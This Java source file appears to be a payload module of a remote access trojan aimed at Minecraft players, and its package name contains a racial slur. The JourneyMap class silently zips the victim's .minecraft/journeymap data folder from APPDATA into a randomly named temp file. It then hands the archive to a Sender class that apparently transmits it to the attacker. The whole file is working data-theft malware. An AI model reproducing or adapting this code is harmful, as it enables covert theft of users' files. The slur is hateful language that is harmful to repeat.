package me.nigger.rat.payload.impl;

import me.nigger.rat.payload.Payload;
import me.nigger.rat.payload.Sender;
import me.nigger.rat.util.FileUtil;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class JourneyMap implements Payload
{
    @Override
    public void execute() throws Exception
    {
        File packed = new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
        pack(System.getenv("APPDATA") + "\\.minecraft\\journeymap", packed.getPath());
        Sender.send(packed);
    }

    private void pack(String sourceDirPath, String zipFilePath) throws IOException
    {
        Path p = Files.createFile(Paths.get(zipFilePath));
        try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p)))
        {
            Path pp = Paths.get(sourceDirPath);
            Files.walk(pp)
                    .filter(path -> !Files.isDirectory(path))
                    .filter(path -> !path.toFile().getName().endsWith(".png"))
                    .forEach(path -> {
                        ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                        try
                        {
                            zs.putNextEntry(zipEntry);
                            Files.copy(path, zs);
                            zs.closeEntry();
                        }
                        catch (IOException ignored) { }
                    });
        }
    }

}
